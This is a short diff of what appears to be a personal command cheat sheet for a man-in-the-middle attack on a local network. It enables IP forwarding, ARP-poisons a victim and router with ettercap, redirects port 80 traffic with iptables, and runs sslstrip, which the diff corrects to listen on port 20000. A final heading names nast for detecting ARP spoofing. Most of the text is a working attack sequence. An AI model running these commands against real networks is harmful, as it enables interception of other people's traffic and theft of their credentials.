@@ -11,9 +11,11 @@ echo "1" > /proc/sys/net/ipv4/ip_forward
 
 ettercap -T -q -i interface -M arp:remote /IP_victim/ /IP_router/
 
-sslstrip.py -f -l port
-
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 20000
+
+sslstrip.py -f -l 20000
+
+
 
 ===== monitor de arp spoofing ===
 nast -p -c
